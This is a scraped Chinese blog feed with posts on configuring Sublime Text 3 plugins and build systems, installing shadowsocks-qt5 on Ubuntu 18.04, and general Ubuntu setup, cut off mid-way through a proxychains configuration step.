id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h2><h3 id="安装package-control"><a href="#安装package-control" class="headerlink" title="安装package control"></a>安装package control</h3><blockquote><p>为了使用众多的插件来扩展 Sublime 的功能，你需要安装一个叫做 <strong>Package Control **的插件管理器,一旦你安装好了以后，你就可以使用 <code>Package Control</code>来安装，</strong>移除<strong>或者</strong>升级**所有的 ST3 插件了。</p></blockquote><ol><li><p>按<code>Ctrl+~</code>打开控制台</p></li><li><p>到 <a href="https://packagecontrol.io/installation#st3" target="_blank" rel="noopener">https://packagecontrol.io/installation#st3</a> 获取安装代码,这里如下</p><pre><code> import urllib.request,os,hashlib; h = &#39;6f4c264a24d933ce70df5dedcf1dcaee&#39; + &#39;ebe013ee18cced0ef93d5f746d80ef60&#39;; pf = &#39;Package Control.sublime-package&#39;; ipp = sublime.installed_packages_path(); urllib.request.install_opener( urllib.request.build_opener( urllib.request.ProxyHandler()) ); by = urllib.request.urlopen( &#39;http://packagecontrol.io/&#39; + pf.replace(&#39; &#39;, &#39;%20&#39;)).read(); dh = hashlib.sha256(by).hexdigest(); print(&#39;Error validating download (got %s instead of %s), please try manual install&#39; % (dh, h)) if dh != h else open(os.path.join( ipp, pf), &#39;wb&#39; ).write(by)</code></pre></li><li><p>输入完了按<code>Enter</code>就行</p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1530636719.jpg" alt></p></li><li><p>现在你可以通过快捷键 <code>Ctrl+Shift+P</code> 打开 <code>Package Control</code>来安装其他的插件了。输入 <code>install</code> 然后你就能看见屏幕上出现了 <code>Package Control: Install Package</code>，点击回车然后搜索你想要的插件。想装什么直接点击。注意看下面的<code>status bar</code>是显示进度的地方</p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1530636851.jpg" alt></p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1530636877.jpg" alt></p></li></ol><h3 id="安装Anaconda-python插件"><a href="#安装Anaconda-python插件" class="headerlink" title="安装Anaconda python插件"></a>安装<code>Anaconda</code> python插件</h3><blockquote><p><a href="https://sublime.wbond.net/packages/Anaconda" target="_blank" rel="noopener">Anaconda</a> 是一个终极 Python 插件。它为 ST3 增添了多项 IDE 类似的功能，其具体配置文件在 <a href="https://github.com/DamnWidget/anaconda" target="_blank" rel="noopener">https://github.com/DamnWidget/anaconda</a> 例如：</p></blockquote><ul><li><p><code>Autocompletion</code>:自动完成，该选项默认开启,按<code>TAB</code>或<code>Ctrl+Space</code>显示代码提示窗口</p></li><li><p><code>Goto Definitions</code>:能够在你的整个工程中查找并且显示任意一个变量，函数，或者类的定义。,键盘按下:<code>Ctrl+Alt+g</code></p></li><li><p><code>Find Usage</code> 使用此命令，用户可以找到正在使用符号（变量，函数，方法，类或模块）的所有位置。键盘按下:<code>Ctrl+Alt+f</code></p></li><li><p><code>Display Signatures</code>:能够显示一个函数或者类的说明性字符串(当然，是在定义了字符串的情况下)<br><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1530639346.jpg" alt></p></li><li><p><code>Show Documentation</code>： 可以查找并向用户显示任何函数，方法，类，模块或包的文档字符串。用户只需将光标放在想要获取文档字符串的符号上（或在括号之后，例如在写入之后<code>sys.exit()</code>),然后键盘按下<code>Ctrl+Alt+d</code></p></li><li><p><code>Code linting</code>:使用支持 pep8 标准的 PyLint 或者 PyFlakes。因为我个人使用的是另外的 linting 工具，所以我会在 Anaconda 的配置文件 Anaconda.sublime-settings中将 linting 完全禁用。操作如下: <code>Sublime &gt; Preferences &gt; Package Settings &gt; Anaconda &gt; Settings – User： {&quot;anaconda_linting&quot;: false}</code></p></li><li><p>最后,配置一下Anaconda</p></li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1530639847.jpg" alt></p><pre><code>{&quot;python_interpreter&quot;:&quot;/usr/bin/python3&quot;,&quot;anaconda_linting&quot;: false,//保存文件后自动pep8格式化&quot;auto_formatting&quot;: true,// st3自动补全&quot;suppress_word_completions&quot;: true,&quot;suppress_explicit_completions&quot;: true,//&quot;complete_parameters&quot;: true}</code></pre><h3 id="SublimeREPL插件"><a href="#SublimeREPL插件" class="headerlink" title="SublimeREPL插件"></a>SublimeREPL插件</h3><blockquote><p><code>SublimeREPL</code>会新建一个交互式命令行界面,让你的py可以有输入</p></blockquote><h4 id="配置python3环境"><a href="#配置python3环境" class="headerlink" title="配置python3环境"></a>配置python3环境</h4><ol><li><p><code>Preferences</code>-&gt;<code>Browse Packages</code>,找到<code>SublimeREPL</code>的文件夹，再进入<code>config</code>文件夹，可以看到许多语言的配置文件，<code>Python</code>也在里面</p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1530640242.jpg" alt></p></li><li><p>在<code>config</code>文件夹下新建<code>python3</code>文件夹,在里面新建<code>Default.sublime-commands</code>和<code>Menu.sublime-menu</code>两个文件(模仿Python文件夹),因为我们Python3目前只要<strong>能打开shell运行，和运行这个脚本</strong>，两个功能，因此就只要包含<code>Python3</code>和 <code>Python3 – Run current file</code>两项就好了</p></li><li><p><code>Default.sublime-commands</code>配置如下：</p><pre><code> [     {         &quot;caption&quot;: &quot;SublimeREPL: Python3&quot;,         &quot;command&quot;: &quot;run_existing_window_command&quot;, &quot;args&quot;:         {             &quot;id&quot;: &quot;repl_python3&quot;,             &quot;file&quot;: &quot;config/Python3/Main.sublime-menu&quot;         }     },     {         &quot;caption&quot;: &quot;SublimeREPL: Python3 - RUN current file&quot;,         &quot;command&quot;: &quot;run_existing_window_command&quot;, &quot;args&quot;:         {             &quot;id&quot;: &quot;repl_python3_run&quot;,             &quot;file&quot;: &quot;config/Python3/Main.sublime-menu&quot;         }     } ]</code></pre></li><li><p><code>Menu.sublime-menu</code>配置如下：</p><pre><code> [     {         &quot;id&quot;: &quot;tools&quot;,         &quot;children&quot;:         [{             &quot;caption&quot;: &quot;SublimeREPL&quot;,             &quot;mnemonic&quot;: &quot;R&quot;,             &quot;id&quot;: &quot;SublimeREPL&quot;,             &quot;children&quot;:             [                 {&quot;caption&quot;: &quot;Python3&quot;,                 &quot;id&quot;: &quot;Python3&quot;,                 &quot;children&quot;:[                     {&quot;command&quot;: &quot;repl_open&quot;,                     &quot;caption&quot;: &quot;Python3&quot;,                     &quot;id&quot;: &quot;repl_python3&quot;,                     &quot;mnemonic&quot;: &quot;P&quot;,                     &quot;args&quot;: {                         &quot;type&quot;: &quot;subprocess&quot;,                         &quot;encoding&quot;: &quot;utf8&quot;,                         &quot;cmd&quot;: [&quot;python3&quot;, &quot;-i&quot;, &quot;-u&quot;],                         &quot;cwd&quot;: &quot;$file_path&quot;,                         &quot;syntax&quot;: &quot;Packages/Python/Python.tmLanguage&quot;,                         &quot;external_id&quot;: &quot;python3&quot;,                         &quot;extend_env&quot;: {&quot;PYTHONIOENCODING&quot;: &quot;utf-8&quot;}                         }                     },                     {&quot;command&quot;: &quot;repl_open&quot;,                     &quot;caption&quot;: &quot;Python3 - RUN current file&quot;,                     &quot;id&quot;: &quot;repl_python3_run&quot;,                     &quot;mnemonic&quot;: &quot;R&quot;,                     &quot;args&quot;: {                         &quot;type&quot;: &quot;subprocess&quot;,                         &quot;encoding&quot;: &quot;utf8&quot;,                         &quot;cmd&quot;: [&quot;python3&quot;, &quot;-u&quot;, &quot;$file_basename&quot;],                         &quot;cwd&quot;: &quot;$file_path&quot;,                         &quot;syntax&quot;: &quot;Packages/Python/Python.tmLanguage&quot;,                         &quot;external_id&quot;: &quot;python3&quot;,                         &quot;extend_env&quot;: {&quot;PYTHONIOENCODING&quot;: &quot;utf-8&quot;}                         }                     }                 ]}             ]         }]     } ]</code></pre></li><li><p>保存文件后,就可以<code>Tools</code>-&gt;<code>SublimeREPL</code>-&gt;<code>Python3</code>运行命令了</p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1530640916.jpg" alt></p></li><li><p>为了好看,采取和<code>Ctr+B</code>同样的上下布局</p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1530641055.jpg" alt></p></li></ol><h4 id="设置key-binding"><a href="#设置key-binding" class="headerlink" title="设置key binding"></a>设置key binding</h4><p>每次这样到菜单栏里去找，太慢，能不能像<code>ctrl+B</code>一样直接运行呢？可以的，只要设置快捷键就好了，在<code>Preference</code>-&gt;<code>key Bindings-User</code>里</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1530641287.jpg" alt></p><p>写入如下配置,即可<code>F4</code>运行<code>python2.7 repl</code>, <code>F5</code> 运行<code>python 3 repl</code>,<strong>注意<code>id</code>还是要和<code>Menu.sublime-menu</code>文件里的<code>id</code>要一致，</strong></p><pre><code>[    {        &quot;keys&quot;:[&quot;f4&quot;],        &quot;caption&quot;: &quot;SublimeREPL: Python - RUN current file&quot;,        &quot;command&quot;: &quot;run_existing_window_command&quot;, &quot;args&quot;:        {            &quot;id&quot;: &quot;repl_python_run&quot;,            &quot;file&quot;: &quot;config/Python/Main.sublime-menu&quot;        }    },    {        &quot;keys&quot;:[&quot;f5&quot;],        &quot;caption&quot;: &quot;SublimeREPL: Python3 - RUN current file&quot;,        &quot;command&quot;: &quot;run_existing_window_command&quot;, &quot;args&quot;:        {            &quot;id&quot;: &quot;repl_python3_run&quot;,            &quot;file&quot;: &quot;config/Python3/Main.sublime-menu&quot;        }    }]</code></pre><h4 id="can’t-open-file-‘-file-basename’-Errno-2-No-such-file-or-directory"><a href="#can’t-open-file-‘-file-basename’-Errno-2-No-such-file-or-directory" class="headerlink" title="can’t open file ‘$file_basename’: [Errno 2] No such file or directory"></a>can’t open file ‘$file_basename’: [Errno 2] No such file or directory</h4><p>这个只要再次用鼠标点击一下<code>test.py</code>就好了，就可以获取运行的文件了</p><h3 id="SublimeTmpl"><a href="#SublimeTmpl" class="headerlink" title="SublimeTmpl"></a>SublimeTmpl</h3><blockquote><p>新建文件模板</p></blockquote><ol><li><p>在<code>settings-user</code>写入以下信息</p><pre><code> {     &quot;disable_keymap_actions&quot;: false, // &quot;all&quot;; &quot;html,css&quot;     &quot;date_format&quot; : &quot;%Y-%m-%d %H:%M:%S&quot;,     &quot;attr&quot;: {         &quot;author&quot;: &quot;江南小虫虫&quot;,         &quot;email&quot;: &quot;fwh13612265462@gmail.com&quot;,         &quot;link&quot;: &quot;http://www.fengwenhua.top&quot;     } }</code></pre></li><li><p><code>Ctlr+Alt+Shift+P</code>:默认创建python文件,这里进行修改.在<code>key bindings-user</code>中添加了以下信息，意思<code>ctrl+alt+n</code>就可以创建一个新的Python模板</p><pre><code>     {         &quot;caption&quot;: &quot;Tmpl: Create python&quot;, &quot;command&quot;: &quot;sublime_tmpl&quot;,         &quot;keys&quot;: [&quot;ctrl+alt+n&quot;], &quot;args&quot;: {&quot;type&quot;: &quot;python&quot;}     },</code></pre><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1532966184.jpg" alt></p></li></ol><h3 id="SideBarEnhancements"><a href="#SideBarEnhancements" class="headerlink" title="SideBarEnhancements"></a>SideBarEnhancements</h3><ul><li>安装完后,可以在<code>View</code>-&gt;<code>Side Bar</code>-&gt;<code>Show Side Bar</code>打开</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181209171421.png" alt></p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><h3 id="隐藏mipmap和打开packages所在目录"><a href="#隐藏mipmap和打开packages所在目录" class="headerlink" title="隐藏mipmap和打开packages所在目录"></a>隐藏mipmap和打开packages所在目录</h3><ol><li><p><code>View</code>-&gt;<code>Hide minimap</code>:隐藏minimap</p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1530637060.jpg" alt></p></li><li><p><code>Preferences</code>-&gt;<code>Browse Packages</code>:打开packages所在目录</p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1530637090.jpg" alt></p></li></ol><h3 id="设置运行python3"><a href="#设置运行python3" class="headerlink" title="设置运行python3"></a>设置运行python3</h3><blockquote><p>sublime默认的是python2.7如果我想让他运行python3，怎么办呢?</p></blockquote><ol><li><p>运行<code>which</code>命令找到<code>python3</code>的路径</p><pre class=" language-bash"><code class="language-bash"> <span class="token function">which</span> python3</code></pre><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1530637554.jpg" alt></p></li><li><p>自定义环境:<code>Tools</code>-&gt;<code>Build System</code>-&gt;<code>New Build System</code>,会弹出一个后缀为<code>sublime-build</code>的文件。</p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1530637688.jpg" alt></p><p> (1) ubuntu/deepin粘贴如下配置,如果发现pyqt5运行的时候啥也不显示，可将<code>&quot;shell&quot;:&quot;true&quot;</code>删掉</p><pre><code> {     &quot;cmd&quot;: [&quot;/usr/bin/python3&quot;, &quot;-u&quot;, &quot;$file&quot;],     &quot;file_regex&quot;: &quot;^[ ]*File \&quot;(...*?)\&quot;, line ([0-9]*)&quot;,     &quot;selector&quot;: &quot;source.python&quot;,     &quot;shell&quot;:&quot;true&quot; }</code></pre><p> (2) windows粘贴下面的:</p><pre><code> {     &quot;cmd&quot;:[&quot;E:\\Python\\Python36-32\\python.exe&quot;,&quot;-u&quot;,&quot;$file&quot;],     &quot;file_regex&quot;: &quot;^[ ]*File \&quot;(...*?)\&quot;, line ([0-9]*)&quot;,     &quot;selector&quot;: &quot;source.python&quot;,     &quot;encoding&quot;: &quot;utf-8&quot; ,     &quot;env&quot;: {&quot;PYTHONIOENCODING&quot;: &quot;utf8&quot;},     &quot;shell&quot;:&quot;true&quot; }</code></pre><p> (3) mac粘贴下面的:</p><pre><code> {     &quot;cmd&quot;: [&quot;/usr/local/bin/python3&quot;, &quot;-u&quot;, &quot;$file&quot;],     &quot;file_regex&quot;: &quot;^[ ]*File \&quot;(...*?)\&quot;, line ([0-9]*)&quot;,     &quot;selector&quot;: &quot;source.python&quot;, }</code></pre></li></ol><p>记住,其中的python3运行路径要和你系统中的路径一致,然后按<code>Ctlr+S</code>保存文件,文件名改为为<code>python3.sublime-build</code>，<strong>保存的路径就是<code>Crtl+S</code>后默认的路径</strong>,然后你在<code>Tools</code>-&gt;<code>Build System</code>,可以看到<code>python3</code>了,选择它再运行python,就会使用python3而不是python2.7了</p><h3 id="一些常用的配置"><a href="#一些常用的配置" class="headerlink" title="一些常用的配置"></a>一些常用的配置</h3><p>打开<code>Preferences</code>-&gt;<code>Settings</code>,可以看到右边有个<code>settings-User</code>,我们修改这个文件就行</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1530638088.jpg" alt></p><ul><li>将一下配置粘贴进去就行<blockquote><p>当然,这里本人是安装了<code>Boxy</code>主题的</p></blockquote></li></ul><pre><code>{    &quot;font_size&quot;: 13,    &quot;ignored_packages&quot;:    [        &quot;Vintage&quot;    ],    &quot;theme&quot;: &quot;Boxy Monokai.sublime-theme&quot;,    // 使用空格代替tab    &quot;translate_tabs_to_spaces&quot;: true,    // 高亮未保存文件    &quot;highlight_modified_tabs&quot;: true,    // 默认编码格式    &quot;default_encoding&quot;: &quot;UTF-8&quot;,    // 窗口失焦立即保存文件    &quot;save_on_focus_lost&quot;: true,    // 保存时自动去除行末空白    &quot;trim_trailing_white_space_on_save&quot;: true,    // 保存时自动增加文件末尾换行,这样 git 提交时不会生产额外的 diff    &quot;ensure_newline_at_eof_on_save&quot;: true,    // 当前行高亮    &quot;highlight_line&quot;: true,    // 设置行间距，看起来不那么&quot;挤&quot;    &quot;line_padding_bottom&quot;: 1,    &quot;line_padding_top&quot;: 1}</code></pre><ul><li>另一种的配置</li></ul><pre><code>{    &quot;color_scheme&quot;: &quot;Packages/Boxy Theme/schemes/Boxy Monokai.tmTheme&quot;,    &quot;default_encoding&quot;: &quot;UTF-8&quot;,    &quot;ensure_newline_at_eof_on_save&quot;: true,    &quot;font_size&quot;: 12,    &quot;highlight_line&quot;: true,    &quot;highlight_modified_tabs&quot;: true,    &quot;ignored_packages&quot;:    [        &quot;Vintage&quot;    ],    &quot;line_padding_bottom&quot;: 1,    &quot;line_padding_top&quot;: 1,    &quot;save_on_focus_lost&quot;: true,    &quot;theme&quot;: &quot;Boxy Monokai.sublime-theme&quot;,    &quot;translate_tabs_to_spaces&quot;: true,    &quot;trim_trailing_white_space_on_save&quot;: true,    &quot;update_check&quot;: false}</code></pre><h3 id="Sublime常用快捷键"><a href="#Sublime常用快捷键" class="headerlink" title="Sublime常用快捷键"></a>Sublime常用快捷键</h3><pre><code>Ctrl+] 向右缩进Ctrl+[ 向左缩进Ctrl+Z 撤销。Ctrl+Y 恢复撤销。Ctrl+F 打开底部搜索框，查找关键字。Ctrl+A 选中全文Ctrl+B 运行pythonCtrl+Shift+P 调出命令窗Ctrl+shift+R 格式化Ctrl+shift+V 格式化粘贴 这个很有用，可以把网上的代码按照我的格式粘到我的文档里Ctrl+//注释 这个比较厉害，如果是python,就是加#号的，想取消再弄一次就好了</code></pre><h3 id="mac-sublime-text-3快捷键"><a href="#mac-sublime-text-3快捷键" class="headerlink" title="mac sublime text 3快捷键"></a>mac sublime text 3快捷键</h3><pre><code>[    {         &quot;caption&quot;: &quot;Tmpl: Create python&quot;, &quot;command&quot;: &quot;sublime_tmpl&quot;,         &quot;keys&quot;: [&quot;ctrl+alt+n&quot;], &quot;args&quot;: {&quot;type&quot;: &quot;python&quot;}     },    { &quot;keys&quot;: [&quot;ctrl+b&quot;], &quot;command&quot;: &quot;build&quot; },    { &quot;keys&quot;: [&quot;ctrl+shift+b&quot;], &quot;command&quot;: &quot;build&quot;, &quot;args&quot;: {&quot;select&quot;: true} },    { &quot;keys&quot;: [&quot;ctrl+f&quot;], &quot;command&quot;: &quot;show_panel&quot;, &quot;args&quot;: {&quot;panel&quot;: &quot;find&quot;, &quot;reverse&quot;: false} },    { &quot;keys&quot;: [&quot;ctrl+s&quot;], &quot;command&quot;: &quot;save&quot; },    { &quot;keys&quot;: [&quot;ctrl+x&quot;], &quot;command&quot;: &quot;cut&quot; },    { &quot;keys&quot;: [&quot;ctrl+c&quot;], &quot;command&quot;: &quot;copy&quot; },    { &quot;keys&quot;: [&quot;ctrl+v&quot;], &quot;command&quot;: &quot;paste&quot; },    { &quot;keys&quot;: [&quot;ctrl+z&quot;], &quot;command&quot;: &quot;undo&quot; },    { &quot;keys&quot;: [&quot;ctrl+shift+p&quot;], &quot;command&quot;: &quot;show_overlay&quot;, &quot;args&quot;: {&quot;overlay&quot;: &quot;command_palette&quot;} },    { &quot;keys&quot;: [&quot;ctrl+a&quot;], &quot;command&quot;: &quot;select_all&quot; },    { &quot;keys&quot;: [&quot;home&quot;], &quot;command&quot;: &quot;move_to&quot;, &quot;args&quot;: {&quot;to&quot;: &quot;bol&quot;} },    { &quot;keys&quot;: [&quot;end&quot;], &quot;command&quot;: &quot;move_to&quot;, &quot;args&quot;: {&quot;to&quot;: &quot;eol&quot;} },    { &quot;keys&quot;: [&quot;shift+end&quot;], &quot;command&quot;: &quot;move_to&quot;, &quot;args&quot;: {&quot;to&quot;: &quot;eol&quot;, &quot;extend&quot;: true} },    { &quot;keys&quot;: [&quot;shift+home&quot;], &quot;command&quot;: &quot;move_to&quot;, &quot;args&quot;: {&quot;to&quot;: &quot;bol&quot;, &quot;extend&quot;: true } }]</code></pre><h3 id="mac-sublime-text-C-C"><a href="#mac-sublime-text-C-C" class="headerlink" title="mac sublime text C/C++"></a>mac sublime text C/C++</h3><pre><code>{    &quot;cmd&quot;: [&quot;bash&quot;, &quot;-c&quot;, &quot;g++ &#39;${file}&#39; -std=c++11 -stdlib=libc++ -o &#39;${file_path}/${file_base_name}&#39;&quot;],    &quot;file_regex&quot;: &quot;^(..{FNXX==XXFN}*):([0-9]+):?([0-9]+)?:? (.*)$&quot;,    &quot;working_dir&quot;: &quot;${file_path}&quot;,    &quot;selector&quot;: &quot;source.c, source.c++&quot;,    &quot;variants&quot;:    [        {        &quot;name&quot;: &quot;Run&quot;,        &quot;cmd&quot;: [&quot;bash&quot;, &quot;-c&quot;, &quot;g++ &#39;${file}&#39; -std=c++11 -stdlib=libc++ -o &#39;${file_path}/${file_base_name}&#39; &amp;&amp; open -a Terminal.app &#39;${file_path}/${file_base_name}&#39;&quot;]        }    ]}</code></pre><h3 id="mac-php"><a href="#mac-php" class="headerlink" title="mac php"></a>mac php</h3><h3 id="终端运行"><a href="#终端运行" class="headerlink" title="终端运行"></a>终端运行</h3><pre><code>{    &quot;cmd&quot;: [&quot;php&quot;, &quot;$file&quot;],    &quot;file_regex&quot;: &quot;php$&quot;,    &quot;selector&quot;: &quot;source.php&quot;}</code></pre><h3 id="浏览器打开"><a href="#浏览器打开" class="headerlink" title="浏览器打开"></a>浏览器打开</h3><blockquote><p>前提mac要开启php</p></blockquote><ol><li><p>安装<code>SidebarEnhancement</code></p></li><li><p>如下图</p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181205211354.png" alt></p></li><li><p>输入以下代码</p><pre><code> {     &quot;/Library/WebServer/Documents/&quot;:{         &quot;url_testing&quot;:&quot;http://localhost/&quot;,         &quot;url_production&quot;:&quot;&quot;     } }</code></pre></li><li><p><strong>将你要编辑的php文件放在该目录下</strong>:<code>/Library/WebServer/Documents/</code>编辑</p></li><li><p>设置快捷键:</p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181205211635.png" alt></p></li><li><p>输入以下代码,以后按<code>Ctrl+R</code>即可运行</p><pre><code> { &quot;keys&quot;:[&quot;ctrl+r&quot;],&quot;command&quot;:&quot;side_bar_open_in_browser&quot;,&quot;args&quot;:{&quot;paths&quot;:[],&quot;type&quot;:&quot;testing&quot;,&quot;browser&quot;:&quot;chrome&quot;}},</code></pre></li></ol><h3 id="安装boxy主题"><a href="#安装boxy主题" class="headerlink" title="安装boxy主题"></a>安装boxy主题</h3><ul><li>复制附件两个文件到指定目录即可</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181209201301.png" alt></p><h3 id="markdown"><a href="#markdown" class="headerlink" title="markdown"></a>markdown</h3><ul><li>Markdown Editing</li><li>MarkdownPreview<blockquote><p>在<code>Preferences</code> -&gt; <code>Key Bindings</code>打开的文件的右侧栏的中括号中添加一行代码,然后用<code>Alt+M</code>就可以用浏览器打开了</p></blockquote></li></ul><pre><code>{ &quot;keys&quot;: [&quot;alt+m&quot;], &quot;command&quot;: &quot;markdown_preview&quot;, &quot;args&quot;: {&quot;target&quot;: &quot;browser&quot;, &quot;parser&quot;:&quot;markdown&quot;}  }</code></pre><ul><li><p>LiveReload</p><blockquote><p>安装成功后, 再次Ctrl+shift+p, 输入<code>LiveReload: Enable/disable plug-ins</code>, 回车, 选择 <code>Simple Reload with delay (400ms)</code>或者<code>Simple Reload</code>，两者的区别仅仅在于后者没有延迟。<br>只要你的sublime保存一次，网页那边就会自动刷新预览</p></blockquote></li><li><p>AdvanceNewFile</p><blockquote><p>找到<code>&quot;default_root&quot;: &quot;project_folder&quot;,</code>，把<code>project_folder</code>改为<code>current</code></p></blockquote></li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181209202442.png" alt></p><h2 id="5-插件源被墙了"><a href="#5-插件源被墙了" class="headerlink" title="5. 插件源被墙了"></a>5. 插件源被墙了</h2><ul><li>国内 <a href="https://packagecontrol.io" target="_blank" rel="noopener">https://packagecontrol.io</a> 无法访问</li><li>解决办法链接: <a href="https://github.com/HBLong/channel_v3_daily" target="_blank" rel="noopener">https://github.com/HBLong/channel_v3_daily</a></li><li>如下</li></ul><pre><code>1. 点击 Preferences &gt; Package Settings &gt; Package Control &gt; Settings - User2. 添加 &quot;channels&quot;: [&quot;https://raw.githubusercontent.com/HBLong/channel_v3_daily/master/channel_v3.json&quot;],</code></pre>]]></content>
      
      
      <categories>
          
          <category> 软件配置 </category>
          
          <category> sublime text 3 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sublime text 3 </tag>
            
            <tag> st3 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ubuntu18.04安装ss-qt5</title>
      <link href="/2018/11/15/ubuntu18-04-an-zhuang-ss-qt5/"/>
      <url>/2018/11/15/ubuntu18-04-an-zhuang-ss-qt5/</url>
      
        <content type="html"><![CDATA[<blockquote><p><del>今天ubuntu18.04正式版终于出来了,笔者等了好久了,于是马上官网下载下来安装一波.界面确实比16.04好看好多</del></p></blockquote><ul><li><p>安装18.04系统之后,当然少不了ss梯子了,然而,在安装<code>shadowsocks-qt5</code>的时候,安装16.04的安装方法如下:</p><pre class=" language-shell"><code class="language-shell">sudo add-apt-repository ppa:hzwhuang/ss-qt5sudo apt updatesudo apt install shadowsocks-qt5</code></pre></li><li><p>然而在第二步update的时候出现了一个错误,如下</p><pre><code>忽略: http://ppa.launchpad.net/hzwhuang/ss-qt5/ubuntu bionic InRelease错误: http://ppa.launchpad.net/hzwhuang/ss-qt5/ubuntu bionic Release  404  Not Found [IP:91.189.95.83 80]</code></pre></li></ul><a id="more"></a><ul><li>Are you kidding me?装不了ss?不存在的!吓得我马上上<a href="https://code.launchpad.net/~hzwhuang/+archive/ubuntu/ss-qt5" target="_blank" rel="noopener">shadowsocks-qt5</a>那里看了一下</li><li>原来是作者还没有测试18.04,这简单啊!将源中的<code>bionic</code>改成<code>artful</code>不就行了?<br>```</li></ul><p>——&gt;原来的如下:<br><a href="http://ppa.launchpad.net/hzwhuang/ss-qt5/ubuntu" target="_blank" rel="noopener">http://ppa.launchpad.net/hzwhuang/ss-qt5/ubuntu</a> bionic main<br>——&gt;改成如下:<br><a href="http://ppa.launchpad.net/hzwhuang/ss-qt5/ubuntu" target="_blank" rel="noopener">http://ppa.launchpad.net/hzwhuang/ss-qt5/ubuntu</a> artful main</p><pre><code>* 操作很简单(dan teng),点左下角九个点点,然后找到软件和更新-&gt;其他软件&gt; 这里一开始笔者是想找到`etc/apt/sources.list`来修改的,但是这个文件里看不到ss-qt5的源... ...* 在这里修改ss-qt5的源,然后继续安装就行了.* 接下来就是 enjoy your ubuntu</code></pre>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> Ubuntu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ss-qt5 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu配置</title>
      <link href="/2018/11/15/ubuntu-pei-zhi/"/>
      <url>/2018/11/15/ubuntu-pei-zhi/</url>
      
        <content type="html"><![CDATA[<h1 id="必备基础"><a href="#必备基础" class="headerlink" title="必备基础"></a>必备基础</h1><h3 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h3><pre class=" language-shell"><code class="language-shell">sudo apt updatesudo apt upgradesudo apt dist-upgrade</code></pre><h3 id="软件安装"><a href="#软件安装" class="headerlink" title="软件安装"></a>软件安装</h3><h3 id="软件包里有的软件-一般都是这个"><a href="#软件包里有的软件-一般都是这个" class="headerlink" title="软件包里有的软件(一般都是这个)"></a>软件包里有的软件(一般都是这个)</h3><pre class=" language-shell"><code class="language-shell">sudo apt install 软件名</code></pre><h3 id="deb结尾的文件"><a href="#deb结尾的文件" class="headerlink" title=".deb结尾的文件"></a><code>.deb</code>结尾的文件</h3><pre class=" language-shell"><code class="language-shell">sudo dpkg -i 软件名</code></pre><a id="more"></a><h3 id="解除依赖"><a href="#解除依赖" class="headerlink" title="解除依赖"></a>解除依赖</h3><pre class=" language-shell"><code class="language-shell">sudo apt -f install</code></pre><h3 id="Ubuntu中软件包管理"><a href="#Ubuntu中软件包管理" class="headerlink" title="Ubuntu中软件包管理"></a>Ubuntu中软件包管理</h3><p>1.下载的软件存放位置</p><pre><code>  /var/cache/apt/archives</code></pre><p>2.安装后软件默认位置</p><pre><code>  /usr/share</code></pre><p>3.可执行文件位置</p><pre><code>  /usr/bin</code></pre><p>4.配置文件位置</p><pre><code>  /etc</code></pre><p>5.lib文件位置</p><pre><code>  /usr/lib</code></pre><hr><h1 id="以下为常用的各种软件"><a href="#以下为常用的各种软件" class="headerlink" title="以下为常用的各种软件"></a>以下为常用的各种软件</h1><h3 id="vm-tool-虚拟机才会使用-用于全屏-复制"><a href="#vm-tool-虚拟机才会使用-用于全屏-复制" class="headerlink" title="vm-tool(虚拟机才会使用,用于全屏,复制)"></a>vm-tool(虚拟机才会使用,用于全屏,复制)</h3><pre class=" language-shell"><code class="language-shell">sudo apt install open-vm-tools-desktop fuse</code></pre><h3 id="删除基本不用的自带软件"><a href="#删除基本不用的自带软件" class="headerlink" title="删除基本不用的自带软件"></a>删除基本不用的自带软件</h3><pre class=" language-shell"><code class="language-shell">sudo apt purge libreoffice-common unity-webapps-common thunderbird totem rhythmbox  simple-scan gnome-mahjongg aisleriot gnome-mines cheese transmission-common gnome-orca webbrowser-app gnome-sudoku  onboard deja-dup</code></pre><h3 id="shadowsocks-qt5-ubuntu18-04失效"><a href="#shadowsocks-qt5-ubuntu18-04失效" class="headerlink" title="shadowsocks-qt5(ubuntu18.04失效)"></a>shadowsocks-qt5(ubuntu18.04失效)</h3><pre class=" language-shell"><code class="language-shell">sudo add-apt-repository ppa:hzwhuang/ss-qt5sudo apt updatesudo apt install shadowsocks-qt5</code></pre><h3 id="proxychains4"><a href="#proxychains4" class="headerlink" title="proxychains4"></a>proxychains4</h3><blockquote><p>借助它，ss才能终端翻墙</p></blockquote><pre class=" language-shell"><code class="language-shell">git clone https://github.com/rofl0r/proxychains-ng.gitcd proxychains-ng./configure --prefix=/usr --sysconfdir=/etcmakesudo make installsudo make install-config</code></pre><p>然后还要编辑一下proxychains的配置文件</p><pre><code>sudo gedit /etc/proxychains.conf# 